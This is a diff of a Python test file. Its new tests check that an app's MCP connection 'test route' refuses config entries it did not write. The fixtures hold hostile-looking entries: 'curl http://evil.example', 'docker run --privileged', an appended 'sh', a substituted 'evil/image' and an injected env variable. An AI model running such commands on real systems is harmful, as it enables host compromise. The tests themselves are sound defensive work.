@@ -764,21 +764,18 @@ def test_test_route_project_scope_reads_the_project_file(app_client, isolated_ho
 def test_test_route_stdio_runs_the_real_server_from_the_file_entry(
     app_client, isolated_home, monkeypatch
 ):
+    monkeypatch.setattr(agents, "_trusted_stdio", lambda *_a: True)
     monkeypatch.setattr(shutil, "which", REAL_WHICH)
     env = stdio_env(isolated_home)
     if REAL_APPDATA:
         env["APPDATA"] = REAL_APPDATA
+    monkeypatch.delenv("MARM_API_KEY", raising=False)
+    for key, value in env.items():
+        if key.startswith("MARM_") or key in {"HOME", "USERPROFILE", "APPDATA"}:
+            monkeypatch.setenv(key, value)
     write_entry(
         isolated_home,
-        {
-            "command": sys.executable,
-            "args": ["-m", "marm_mcp_server.server_stdio"],
-            "env": {
-                k: env[k]
-                for k in env
-                if k.startswith("MARM_") or k in {"HOME", "USERPROFILE", "APPDATA"}
-            },
-        },
+        {"command": sys.executable, "args": ["-m", "marm_mcp_server.server_stdio"]},
     )
 
     body = app_client.post(
@@ -791,7 +788,8 @@ def test_test_route_stdio_runs_the_real_server_from_the_file_entry(
     assert body["tools"] == 16
 
 
-def test_test_route_stdio_spawn_failure(app_client, isolated_home):
+def test_test_route_stdio_spawn_failure(app_client, isolated_home, monkeypatch):
+    monkeypatch.setattr(agents, "_trusted_stdio", lambda *_a: True)
     write_entry(
         isolated_home, {"command": str(isolated_home / "missing-binary"), "args": []}
     )
@@ -802,6 +800,95 @@ def test_test_route_stdio_spawn_failure(app_client, isolated_home):
 
     assert body["transport"] == "stdio"
     assert body["error"]["kind"] == "spawn_failed"
+
+
+@pytest.fixture
+def probe_calls(monkeypatch):
+    calls: list = []
+
+    def fake(argv, env):
+        calls.append((argv, env))
+        return {
+            "ok": True,
+            "transport": "stdio",
+            "tools": 1,
+            "latency_ms": 1,
+            "error": None,
+        }
+
+    monkeypatch.setattr(mcp_probe, "probe_stdio", fake)
+    return calls
+
+
+def run_test_route(client):
+    return client.post(
+        "/api/connections/agents/cursor/test", json={"scope": "user"}
+    ).json()
+
+
+def test_test_route_refuses_a_command_marm_did_not_write(
+    app_client, isolated_home, probe_calls
+):
+    write_entry(isolated_home, {"command": "curl", "args": ["http://evil.example"]})
+
+    body = run_test_route(app_client)
+
+    assert body["ok"] is False
+    assert body["error"]["kind"] == "unsupported"
+    assert "Click Connect" in body["error"]["detail"]
+    assert probe_calls == []
+
+
+def test_test_route_refuses_extra_arguments_on_the_marm_command(
+    app_client, isolated_home, probe_calls
+):
+    write_entry(isolated_home, {"command": "marm-mcp-stdio", "args": ["--danger"]})
+
+    assert run_test_route(app_client)["error"]["kind"] == "unsupported"
+    assert probe_calls == []
+
+
+def test_test_route_runs_the_marm_stdio_command_without_the_entrys_env(
+    app_client, isolated_home, probe_calls
+):
+    write_entry(
+        isolated_home,
+        {"command": "marm-mcp-stdio", "args": [], "env": {"MARM_INJECTED": "1"}},
+    )
+
+    assert run_test_route(app_client)["ok"] is True
+    argv, env = probe_calls[0]
+    assert argv == ["marm-mcp-stdio"]
+    assert "MARM_INJECTED" not in env
+
+
+def test_test_route_runs_only_the_docker_command_marm_writes(
+    app_client, isolated_home, probe_calls, monkeypatch
+):
+    data_dir = isolated_home / ".marm"
+    data_dir.mkdir()
+    monkeypatch.setattr(
+        agents.user_settings,
+        "load_docker",
+        lambda: {"tag": "latest", "data_dir": str(data_dir)},
+    )
+    arguments = agents.docker_commands.stdio_command(tag="latest", data_dir=data_dir)[
+        "arguments"
+    ]
+
+    write_entry(isolated_home, {"command": "docker", "args": arguments[1:]})
+    assert run_test_route(app_client)["ok"] is True
+    assert probe_calls[0][0] == arguments
+
+    probe_calls.clear()
+    for args in (
+        [*arguments[1:], "sh"],
+        ["run", "--privileged", *arguments[2:]],
+        [*arguments[1:-1], "evil/image:latest"],
+    ):
+        write_entry(isolated_home, {"command": "docker", "args": args})
+        assert run_test_route(app_client)["error"]["kind"] == "unsupported"
+    assert probe_calls == []
 
 
 # --- Skill install -------------------------------------------------------------------------------
